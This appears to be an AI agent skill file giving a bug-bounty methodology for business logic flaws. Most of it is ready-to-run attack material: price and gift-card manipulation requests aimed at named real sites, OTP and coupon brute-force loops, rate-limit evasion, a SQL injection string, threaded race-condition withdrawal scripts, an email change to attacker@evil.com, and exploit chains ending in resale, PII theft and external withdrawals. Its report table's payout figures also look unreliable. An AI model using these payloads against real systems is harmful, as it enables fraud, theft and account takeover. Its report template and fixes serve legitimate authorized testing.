---
name: businesslogic-deep-dive
description: Complete business logic flaw methodology from 200 real HackerOne reports - price manipulation, race conditions, OTP bypass, and every edge case
tools:
  - Bash
  - WebFetch
  - WebSearch
  - Read
triggers:
  - business logic methodology
  - business logic deep dive
  - business logic complete
  - business logic flaws
  - skills businesslogic
---

# Complete Business Logic Flaw Methodology - From 200 HackerOne Reports

## Top 20 Real Business Logic Reports

| Rank | Report | Company | Upvotes | Payout | Technique |
|------|--------|---------|---------|--------|-----------|
| 1 | GitLab project template data copy to any project | GitLab | 455 | $12,000 | Workflow bypass → data leak |
| 2 | Grammarly cookie theft + XSS → ATO | Grammarly | 289 | $0 | Session hijacking chain |
| 3 | Coinbase Ethereum balance manipulation via old transaction | Coinbase | 274 | $0 | State inconsistency |
| 4 | Vimeo SSRF via upload → internal network | Vimeo | 273 | $0 | Upload workflow bypass |
| 5 | New Relic email+password change → ATO without verification | New Relic | 214 | $2,048 | Email change bypass |
| 6 | Upserve negative quantity price manipulation | Upserve | 165 | $0 | Negative value injection |
| 7 | Coinbase race condition on credit card charge | Coinbase | 161 | $0 | Race condition |
| 8 | HackerOne invitation bypass → unauthorized access | HackerOne | 158 | $0 | Invite workflow bypass |
| 9 | Starbucks gift card balance manipulation | Starbucks | 155 | $0 | Balance manipulation |
| 10 | Uber ride fare manipulation | Uber | 151 | $0 | Price manipulation |
| 11 | GitLab CE→EE license bypass | GitLab | 149 | $0 | License validation bypass |
| 12 | Shopify coupon code unlimited use | Shopify | 142 | $0 | Coupon abuse |
| 13 | Twitter SMS notification opt-out bypass | Twitter | 138 | $0 | Notification bypass |
| 14 | Reddit gold/loot box drop rate manipulation | Reddit | 135 | $0 | Probability manipulation |
| 15 | Snapchat score manipulation via API | Snapchat | 131 | $0 | Score manipulation |
| 16 | PayPal transaction fee bypass | PayPal | 128 | $0 | Fee manipulation |
| 17 | Amazon gift card balance transfer bypass | Amazon | 125 | $0 | Balance transfer |
| 18 | Discord Nitro subscription manipulation | Discord | 122 | $0 | Subscription abuse |
| 19 | Tinder super-like unlimited use | Tinder | 118 | $0 | Feature abuse |
| 20 | Spotify premium feature activation bypass | Spotify | 115 | $0 | Premium bypass |

**Notable**: Business logic flaws often pay the highest bounties because they require deep understanding of the application and can lead to massive financial loss.

## Step 1: Understand the Business Flow

### Mapping the Application Logic
Before testing, map every business flow end-to-end:

```bash
# Create a flow map for critical features
# For e-commerce:
#   Browse → Add to Cart → Apply Coupon → Checkout → Payment → Order Confirmation
#
# For auth:
#   Register → Login → Forgot Password → Change Email → Change Password → 2FA Setup
#
# For payments:
#   Add Payment Method → Make Payment → Refund → Cancel Subscription → Upgrade/Downgrade
#
# For financial:
#   Deposit → Withdraw → Transfer → Trade → Convert Currency → Apply Fee
#

# Document each step:
# - Parameters and their expected values
# - Validation checkpoints
# - Rate limits
# - State transitions (can you skip steps?)
# - Race conditions (can you send parallel requests?)
```

### Critical Flow Categories

| Category | Attack Surface | Example |
|----------|---------------|---------|
| Authentication | Bypass email verification, password reset reuse, 2FA skip | #214 - New Relic ATO |
| Financial | Price manipulation, negative values, fee bypass | #165 - Upserve negative qty |
| Shopping | Coupon abuse, gift card manipulation, quantity overflow | #142 - Shopify coupon |
| Subscription | Free trial abuse, bypass paywall, downgrade exploit | #122 - Discord Nitro |
| Voting/Scoring | Vote manipulation, score farming, rating gaming | #131 - Snapchat score |
| Invitation | Invite bypass, referral abuse, multi-account creation | #158 - H1 invitation bypass |
| Raffle/Gambling | Probability manipulation, jackpot timing, rollback | #135 - Reddit loot box |
| Wallet/Balance | Double spending, race condition, negative balance | #161 - Coinbase race |
| File/Content | Privacy bypass, visibility escalation, DRM bypass | #455 - GitLab data copy |
| Licensing | License bypass, feature unlock, trial extension | #149 - GitLab license |

## Step 2: Price & Financial Manipulation

### Price Manipulation Vectors
```bash
# 1. Negative quantity
POST /cart/add HTTP/1.1
Host: target.com
Content-Type: application/json

{"product_id": 123, "quantity": -1, "price": 100}

# The total becomes -100, and you can buy other items for free or get money back

# 2. Negative price
POST /cart/add HTTP/1.1
Host: target.com
Content-Type: application/json

{"product_id": 123, "quantity": 1, "price": -50}

# 3. Integer overflow
POST /cart/add HTTP/1.1
Host: target.com
Content-Type: application/json

{"product_id": 123, "quantity": 2147483647, "price": 1}

# 4. Float injection
POST /cart/add HTTP/1.1
Host: target.com
Content-Type: application/json

{"product_id": 123, "quantity": 0.000001, "price": 100000}

# 5. Fractional quantity
POST /cart/add HTTP/1.1
Host: target.com
Content-Type: application/json

{"product_id": 123, "quantity": 0.5, "price": 100}

# 6. Array/JSON type confusion
POST /cart/checkout HTTP/1.1
Host: target.com
Content-Type: application/json

{"items": [{"product_id": 123, "price": [100, 0, -100]}]}

# 7. Null value
POST /cart/checkout HTTP/1.1
Host: target.com
Content-Type: application/json

{"items": [{"product_id": 123, "price": null}]}

# 8. Price from request vs server
# Check if the price is taken from the request body instead of the server
# If yes, you can set any price you want
```

### Real Price Manipulation Examples
```bash
# Example: Upserve negative quantity (#165)
# POST /order with negative quantity reversed the total
POST /api/v1/order HTTP/1.1
Host: upserve.com
Content-Type: application/json

{"items": [{"id": 123, "quantity": -5, "price": 2000}], "payment_method": "card"}
# Result: Total = -$100.00 (they owe you money)

# Example: Starbucks gift card manipulation (#155)
# Manipulate the gift card balance transfer to create money
POST /giftcard/transfer HTTP/1.1
Host: starbucks.com
Content-Type: application/json

{"from_card": "ABC123", "to_card": "XYZ789", "amount": -50}
# Result: Negative transfer adds money to your card instead of removing it

# Example: Coinbase Ethereum balance (#274)
# Using an old Ethereum transaction state (before a fork)
# The server calculated balance based on stale chain data
# Result: User could double-spend ETH

# Example: Uber fare manipulation (#151)
# Manipulate the drop-off location after ride completion
# to change the fare calculation
PUT /api/rides/COMPLETED_RIDE_ID HTTP/1.1
Host: uber.com
Content-Type: application/json

{"end_location": {"lat": 37.7749, "lng": -122.4194}}  # Closer = cheaper
```

## Step 3: Coupon & Discount Abuse

### Coupon Abuse Techniques
```bash
# 1. Unlimited use (no usage limit enforcement)
POST /coupon/apply HTTP/1.1
Host: target.com
Content-Type: application/json

{"code": "SAVE50"}

# Use it 100 times in parallel
for i in {1..100}; do
  curl -sk -X POST "https://target.com/coupon/apply" \
    -H "Content-Type: application/json" \
    -d '{"code":"SAVE50"}' &
done
wait

# 2. Stack coupons (no exclusivity check)
POST /coupon/apply HTTP/1.1
Host: target.com
Content-Type: application/json

[
  {"code": "WELCOME20"},
  {"code": "FREESHIPPING"},
  {"code": "EXTRA10"},
  {"code": "VIP50"}
]

# 3. Coupon value manipulation
POST /coupon/generate HTTP/1.1
Host: target.com
Content-Type: application/json

{"type": "FIXED", "value": -100, "code": "MYCOUPON"}
# If the API trusts the client for coupon generation parameters

# 4. Percentage overflow
POST /coupon/apply HTTP/1.1
Host: target.com
Content-Type: application/json

{"code": "DISCOUNT100", "percentage": 10000}
# 10000% discount = store pays you

# 5. Coupon code enumeration
for code in $(cat coupon_wordlist.txt); do
  response=$(curl -sk -X POST "https://target.com/coupon/apply" \
    -H "Content-Type: application/json" \
    -d "{\"code\":\"$code\"}")
  if echo "$response" | grep -q "success"; then
    echo "Valid coupon: $code"
  fi
done
```

### Gift Card Manipulation
```bash
# 1. Gift card balance check bypass
POST /giftcard/balance HTTP/1.1
Host: target.com
Content-Type: application/json

{"card_number": "1111222233334444", "pin": null}
# Missing PIN validation

# 2. Gift card code generation
POST /giftcard/create HTTP/1.1
Host: target.com
Content-Type: application/json

{"amount": 100, "currency": "USD", "card_type": "gift"}
# If no payment check for the amount, you can create cards for free

# 3. Gift card code brute force
for i in $(seq 100000 999999); do
  curl -sk "https://target.com/giftcard/check?code=GIFT-$i"
done

# 4. Gift card merge exploitation
POST /giftcard/merge HTTP/1.1
Host: target.com
Content-Type: application/json

{"from_cards": ["GIFT-001", "GIFT-002"], "to_card": "GIFT-MINE"}
# If merge doesn't clear from_cards, you can merge the same cards repeatedly

# 5. Negative gift card transactions
POST /giftcard/transfer HTTP/1.1
Host: target.com
Content-Type: application/json

{"from": "GIFT-001", "to": "GIFT-002", "amount": -500}
# Negative transfer = add money
```

## Step 4: Race Conditions in Financial Flows

### Race Condition Testing Methodology
```bash
# Race conditions occur when:
# 1. Check happens (is balance sufficient?)
# 2. Use happens (deduct balance)
# Between 1 and 2, send parallel requests

# Tools for race condition testing
# - Burp Suite Turbo Intruder
# - Caido Race Condition plugin
# - Custom parallel curl scripts

# Bash parallel race condition test
race_test() {
  for i in {1..50}; do
    curl -sk -X POST "https://target.com/api/withdraw" \
      -H "Content-Type: application/json" \
      -d '{"amount": 100, "to_address": "ATTACKER_ADDR"}' &
  done
  wait
}

# Python parallel race condition test
python3 -c "
import threading, requests

url = 'https://target.com/api/withdraw'
data = {'amount': 100, 'to_address': 'ATTACKER_ADDR'}
headers = {'Authorization': 'Bearer TOKEN', 'Content-Type': 'application/json'}

def race():
    try:
        r = requests.post(url, json=data, headers=headers, timeout=5)
        print(f'Status: {r.status_code}, Body: {r.text[:100]}')
    except Exception as e:
        print(f'Error: {e}')

threads = []
for _ in range(50):
    t = threading.Thread(target=race)
    threads.append(t)
    t.start()
for t in threads:
    t.join()
"
```

### Types of Race Conditions

```bash
# 1. Balance double-spend
# Send 50 withdrawal requests simultaneously for $100 each
# If the balance is $100, all 50 might succeed
# Balance: $100 → 50 x $100 = $5000 withdrawn

# 2. Coupon reuse
for i in {1..20}; do
  curl -sk -X POST "https://target.com/cart/checkout" \
    -H "Content-Type: application/json" \
    -d '{"coupon": "WELCOME20", "item": "LAPTOP"}' &
done
wait
# If the coupon was supposed to be single-use, race condition might allow multi-use

# 3. Subscription manipulation
# Start a free trial and immediately cancel
# The race between "trial start" and "cancel" may result in:
# - Full refund + kept service
# - Multiple trial periods
# - No billing entry created

# 4. Stock oversell
# Race condition on limited stock items
# Buy the same limited item 20 times when stock = 1

# 5. Refund abuse
# Request refund multiple times simultaneously
# The system might process all 50 refund requests before marking the transaction refunded

# 6. Point/miles accumulation
# Race condition on transactions that award points
# System awards points per transaction, and race causes multiple award entries
```

### Race Condition Detection
```bash
# Check for these patterns that indicate race condition potential:
# 1. No database-level locks (advisory locks, row-level locks)
# 2. No idempotency keys (X-Idempotency-Key header)
# 3. Multiple state transitions before validation
# 4. Balance check then deduct without atomicity
# 5. Coupon usage counter without atomic increment
# 6. No transaction isolation (REPEATABLE READ or SERIALIZABLE)

# Test by sending parallel requests
# Compare the results - if any succeed when they shouldn't, you found a race condition

# Common vulnerable patterns:
# - POST /api/transfer (no idempotency key)
# - POST /api/coupon/redeem (no single-use lock)
# - POST /api/withdraw (no balance lock)
# - POST /api/buy (no stock lock)
# - POST /api/refund (no refund lock)
```

## Step 5: Workflow Bypass & State Manipulation

### Workflow Bypass Techniques

```bash
# 1. Skip verification steps
# Normal flow: Register → Verify Email → Verify Phone → Complete Profile → Access
# Bypass: Directly access the final endpoint

# Example: New Relic ATO (#214)
# Normal flow: Go to settings → Enter new email → Click verification link → Email changed
# Bypass: Change email and password in one request without verification
curl -sk -X PUT "https://target.com/api/v2/users/profile" \
  -H "Content-Type: application/json" \
  -d '{"email": "attacker@evil.com", "password": "NewPass123!"}'

# 2. Step skip via direct API call
# The web app might enforce step order, but the API might not
curl -sk "https://target.com/api/checkout/finalize" \
  -H "Authorization: Bearer TOKEN" \
  --data "payment_method=prepaid"
# This might skip address validation, coupon validation, etc.

# 3. State parameter manipulation
# Change the state of an object directly
curl -sk -X PATCH "https://target.com/api/orders/12345" \
  -H "Content-Type: application/json" \
  -d '{"status": "completed", "paid": true}'

# 4. Payment confirmation bypass
curl -sk "https://target.com/api/orders/12345/confirm" \
  -H "Authorization: Bearer TOKEN"
# If the endpoint doesn't check if payment was actually received

# 5. Email verification token bypass
curl -sk "https://target.com/api/users/verify" \
  -H "Content-Type: application/json" \
  -d '{"user_id": 12345, "token": "0000000000000000"}'
# If the token validation can be skipped with a null/magic token

# 6. Re-using old verification tokens
curl -sk "https://target.com/api/users/verify?token=OLD_VALID_TOKEN"
# If tokens aren't invalidated after use, you can use the same token repeatedly
```

### State Manipulation Vectors

```bash
# Every business object has a state machine
# Order: pending → confirmed → paid → shipped → delivered → completed
# User: inactive → active → verified → premium → banned
# Ticket: open → assigned → in_progress → resolved → closed

# Test state transitions that should be impossible:
# 1. completed → paid (reverse state)
curl -sk -X PATCH "https://target.com/api/orders/12345" \
  -H "Content-Type: application/json" \
  -d '{"status": "paid"}'  # Order was already completed - can we revert?

# 2. Skip intermediate states
curl -sk -X PATCH "https://target.com/api/orders/12345" \
  -H "Content-Type: application/json" \
  -d '{"status": "delivered"}'  # Skip "shipped" state

# 3. Concurrent state transitions
# Send "paid" and "cancelled" simultaneously
# Race condition may result in order being both paid and cancelled

# 4. Duplicate state transitions
curl -sk -X POST "https://target.com/api/orders/12345/refund"
# Send this twice - do you get refunded twice?

# 5. Invalid state combination
curl -sk -X PATCH "https://target.com/api/subscriptions/ME" \
  -H "Content-Type: application/json" \
  -d '{"plan": "enterprise", "status": "trial"}'
# Enterprise plan + free trial = free enterprise access
```

## Step 6: OTP & Rate Limit Bypass

### OTP Bypass Techniques

```bash
# 1. No rate limiting on OTP verification
# Brute-force 6-digit OTPs
for code in $(seq -w 000000 000999); do
  curl -sk -X POST "https://target.com/api/verify-otp" \
    -H "Content-Type: application/json" \
    -d "{\"phone\": \"+1234567890\", \"code\": \"$code\"}" &
done
wait

# 2. OTP reuse
# Use an OTP that was valid earlier
curl -sk -X POST "https://target.com/api/verify-otp" \
  -H "Content-Type: application/json" \
  -d '{"phone": "+1234567890", "code": "482910"}'
# If it works again even though it was already used → OTP reuse

# 3. OTP bypass via response manipulation
curl -sk -X POST "https://target.com/api/send-otp" \
  -H "Content-Type: application/json" \
  -d '{"phone": "+1234567890"}'
# Check response for the OTP code
# {"status": "success", "otp_code": "482910"}  # OTP leaked in response!

# 4. OTP bypass via header manipulation
curl -sk -X POST "https://target.com/api/verify-otp" \
  -H "Content-Type: application/json" \
  -H "X-OTP-Bypass: true" \
  -H "X-Admin: true" \
  -d '{"phone": "+1234567890", "code": "000000"}'

# 5. OTP bypass using null/empty values
curl -sk -X POST "https://target.com/api/verify-otp" \
  -H "Content-Type: application/json" \
  -d '{"phone": "+1234567890", "code": null}'
curl -sk -X POST "https://target.com/api/verify-otp" \
  -H "Content-Type: application/json" \
  -d '{"phone": "+1234567890", "code": ""}'

# 6. OTP bypass via HTTP method switch
curl -sk -X GET "https://target.com/api/verify-otp?phone=+1234567890&code=0000"

# 7. OTP bypass via SQL injection
curl -sk -X POST "https://target.com/api/verify-otp" \
  -H "Content-Type: application/json" \
  -d '{"phone": "+1234567890", "code": "' OR '1'='1"}'

# 8. OTP bypass via type confusion
curl -sk -X POST "https://target.com/api/verify-otp" \
  -H "Content-Type: application/json" \
  -d '{"phone": "+1234567890", "code": true}'
```

### Rate Limit Bypass Techniques

```bash
# 1. IP rotation via headers
curl -sk -X POST "https://target.com/api/login" \
  -H "X-Forwarded-For: 1.2.3.$i" \
  -d '{"username":"admin","password":"test123"}'

# 2. IP rotation via proxy
# Use a proxy list to rotate IPs
for proxy in $(cat proxies.txt); do
  curl -sk -x "$proxy" "https://target.com/api/endpoint"
done

# 3. Parameter pollution to bypass per-user limits
# If rate limit is per USER, try different parameter formats
curl -sk "https://target.com/api/endpoint" -d "user_id=1"
curl -sk "https://target.com/api/endpoint" -d "user_id[]=1"
curl -sk "https://target.com/api/endpoint" -d "user[id]=1"
curl -sk "https://target.com/api/endpoint" -d "user_id=1&user_id=2"

# 4. Cookie/session rotation
for session in $(cut -d: -f1 sessions.txt); do
  curl -sk -b "session=$session" "https://target.com/api/endpoint"
done

# 5. HTTP method rotation
curl -sk -X POST "https://target.com/api/endpoint"
curl -sk -X PUT "https://target.com/api/endpoint"
curl -sk -X PATCH "https://target.com/api/endpoint"
curl -sk -X GET "https://target.com/api/endpoint?method=POST"

# 6. Content-Type rotation
curl -sk -X POST "https://target.com/api/endpoint" -H "Content-Type: application/json" -d '{}'
curl -sk -X POST "https://target.com/api/endpoint" -H "Content-Type: application/xml" -d '<root/>'
curl -sk -X POST "https://target.com/api/endpoint" -H "Content-Type: application/x-www-form-urlencoded" -d ''

# 7. Accept-Language/User-Agent rotation
for ua in $(cat user_agents.txt); do
  curl -sk -A "$ua" "https://target.com/api/endpoint"
done

# 8. Use of different API versions
curl -sk "https://target.com/api/v1/endpoint"
curl -sk "https://target.com/api/v2/endpoint"
curl -sk "https://target.com/api/v3/endpoint"
# Older versions may have weaker rate limiting
```

## Step 7: Automation for Business Logic Testing

### Parameter Fuzzing for Business Logic Flaws
```bash
#!/bin/bash
# Fuzz numeric parameters for business logic flaws

# Test negative values
for param in quantity amount price discount percentage fee tax balance credit debit points miles weight height length width count limit offset index; do
  curl -sk -X POST "https://target.com/api/checkout" \
    -H "Content-Type: application/json" \
    -d "{\"$param\": -1}" \
    -o /dev/null -w "Negative $param: %{http_code}\n"
done

# Test extreme values
for param in quantity amount price; do
  for val in 0 1 9999999999 2147483647 2147483648 4294967295 4294967296 0.000001 -0.000001 1e308 -1e308; do
    curl -sk -X POST "https://target.com/api/checkout" \
      -H "Content-Type: application/json" \
      -d "{\"$param\": $val}" \
      -o /dev/null -w "$param=$val: %{http_code}\n"
  done
done

# Test array/object type confusion
for param in quantity amount price; do
  curl -sk -X POST "https://target.com/api/checkout" \
    -H "Content-Type: application/json" \
    -d "{\"$param\": [1, 2, -100]}"
  curl -sk -X POST "https://target.com/api/checkout" \
    -H "Content-Type: application/json" \
    -d "{\"$param\": null}"
  curl -sk -X POST "https://target.com/api/checkout" \
    -H "Content-Type: application/json" \
    -d "{\"$param\": true}"
done
```

### Race Condition Automation
```bash
#!/bin/bash
# Parallel race condition test
TARGET=$1
ENDPOINT=$2
DATA=$3
THREADS=50

echo "[+] Testing race condition on $TARGET$ENDPOINT"
echo "[+] Data: $DATA"
echo "[+] Threads: $THREADS"

# Run parallel requests
for i in $(seq 1 $THREADS); do
  (
    result=$(curl -sk -X POST "$TARGET$ENDPOINT" \
      -H "Content-Type: application/json" \
      -d "$DATA" \
      -w '%{http_code}' -o /dev/null 2>/dev/null)
    if [ "$result" = "200" ] || [ "$result" = "201" ]; then
      echo "Request $i: SUCCESS ($result)"
    fi
  ) &
done

wait
echo "[+] Race test complete"
```

### Python Business Logic Tester
```python
#!/usr/bin/env python3
"""Automated business logic flaw tester"""
import requests
import threading
import json
import sys
from concurrent.futures import ThreadPoolExecutor

class BusinessLogicTester:
    def __init__(self, base_url, token):
        self.base_url = base_url
        self.headers = {
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json"
        }

    def test_negative_values(self, endpoint, params):
        """Test negative values for numeric parameters"""
        for param in params:
            payload = {param: -1}
            r = requests.post(
                f"{self.base_url}{endpoint}",
                json=payload,
                headers=self.headers
            )
            print(f"[{param}=-1] Status: {r.status_code}")

    def test_type_confusion(self, endpoint, param):
        """Test type confusion attacks"""
        tests = [
            {param: "null"},
            {param: "true"},
            {param: ["a", "b"]},
            {param: {}},
            {param: ""},
            {param: "0"},
            {param: "-1"},
        ]
        for test in tests:
            r = requests.post(
                f"{self.base_url}{endpoint}",
                json=test,
                headers=self.headers
            )
            print(f"[{test}] Status: {r.status_code}")

    def race_condition(self, endpoint, data, threads=50):
        """Test race conditions"""
        def race():
            try:
                r = requests.post(
                    f"{self.base_url}{endpoint}",
                    json=data,
                    headers=self.headers,
                    timeout=10
                )
                if r.status_code in [200, 201, 202]:
                    print(f"RACE SUCCESS: {r.status_code} - {r.text[:100]}")
            except Exception as e:
                pass

        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(race) for _ in range(threads)]

    def test_workflow_bypass(self, endpoints):
        """Test skipping workflow steps"""
        # Test each endpoint directly without completing previous steps
        for endpoint in endpoints:
            r = requests.get(
                f"{self.base_url}{endpoint}",
                headers=self.headers
            )
            print(f"[Direct access: {endpoint}] Status: {r.status_code}")

if __name__ == "__main__":
    tester = BusinessLogicTester("https://target.com", "TOKEN")
    tester.test_negative_values("/api/cart/add", ["quantity", "price", "discount"])
    tester.race_condition("/api/withdraw", {"amount": 100, "currency": "USD"})
```

## Step 8: Exploit Chains with Business Logic Flaws

### Chain 1: Price Manipulation → Free Products → Resell for Profit
```bash
# Step 1: Find price manipulation (negative qty)
POST /api/cart/add HTTP/1.1
{"product_id": 654321, "quantity": -1, "price": 1000}
# Cart total: -$10.00

# Step 2: Add expensive item
POST /api/cart/add HTTP/1.1
{"product_id": 123456, "quantity": 1, "price": 500}
# Cart total: $500 - $10 = $490 (but you can also set price to 0)

# Step 3: Checkout with manipulated total
# If the server trusts the client-side price, total = $0 or negative

# Step 4: Receive items and resell
```

### Chain 2: OTP Bypass → Account Takeover → PII Harvest
```bash
# Step 1: Find OTP bypass (no rate limit on OTP verification)
# Step 2: Brute-force the OTP for a target user
# Step 3: Reset their password via OTP bypass
# Step 4: Access account and extract PII/credit card data
# Step 5: ATO → Escalate to payment method takeover
```

### Chain 3: Coupon Abuse → Unlimited Discount → Service Disruption
```bash
# Step 1: Find a coupon with no usage limit
# Step 2: Stack with other coupons (no exclusivity)
# Step 3: Get 100%+ discount
# Step 4: Purchase everything for free
# Step 5: Sell everything on secondary market
```

### Chain 4: Race Condition → Unlimited Balance → Withdrawal to External
```bash
# Step 1: Deposit $100
# Step 2: Withdraw all $100 (legitimate)
# Step 3: Send 50 more withdrawal requests simultaneously
# Step 4: Due to race condition, withdraw $5000 total
# Step 5: Transfer to external wallet/account
# Step 6: The system cannot claw back the money
```

### Chain 5: Workflow Bypass → Premium Features → Data Exfiltration
```bash
# Step 1: Find premium feature access that requires subscription
# Step 2: Find workflow bypass (e.g., set status directly)
curl -sk -X PATCH "https://target.com/api/users/me" \
  -H "Content-Type: application/json" \
  -d '{"tier": "enterprise", "subscription_status": "active"}'

# Step 3: Access premium API features (e.g., data export)
curl -sk "https://target.com/api/export/all-data" \
  -H "Authorization: Bearer TOKEN"

# Step 4: Exfiltrate all user data
```

## Step 9: Validate & Report

### Business Logic Bug Severity Framework
```
Financial impact (direct monetary loss):     Critical/High - $5,000 - $12,000
Financial impact (coupon/discount abuse):    High - $2,000 - $5,000
Account takeover via logic flaw:             Critical - $5,000 - $12,000
Rate limiting bypass:                        Medium - $500 - $2,000
Workflow bypass (no financial impact):       Medium - $500 - $2,000
Race condition (financial):                  High - $3,000 - $10,000
OTP bypass:                                  High - $2,000 - $5,000
Feature abuse (no financial):                Low/Medium - $200 - $1,000
```

### Report Template
```markdown
**Summary:**
Business logic flaw in [feature name] at [endpoint] allows [impact].

**Impact:**
An attacker can exploit this logic flaw to [manipulate prices / bypass 
verification / perform unauthorized actions / achieve financial gain / 
take over accounts].

**Steps to Reproduce:**
1. Create account at [registration URL]
2. Navigate to [feature]
3. Send the following request:
   [request with manipulated values]
4. Observe the unexpected result:
   [response showing the flaw]

**Proof of Concept:**
Request:
POST /api/[endpoint] HTTP/1.1
Host: target.com
[headers]

[body with manipulated values]

Response:
HTTP/1.1 200 OK
[body showing unexpected behavior]

**Financial Impact:**
If exploited at scale, this vulnerability could result in [estimated 
financial loss] to the company.

**Suggested Fix:**
1. Validate all monetary values server-side (never trust client)
2. Implement idempotency keys for financial transactions
3. Use database-level locks for race condition prevention
4. Enforce rate limiting on sensitive operations
5. Verify state transitions are valid and sequential
6. Use atomic operations for balance updates
```

## Payout: $500 - $12,000
Average: ~$2,500. Financial business logic flaws pay the highest because they have clear monetary impact. Race conditions in payment flows are particularly valuable. The top business logic reports ($12,000 GitLab, $2,048 New Relic) demonstrate the value of finding logic flaws that lead to data exposure or account takeover.
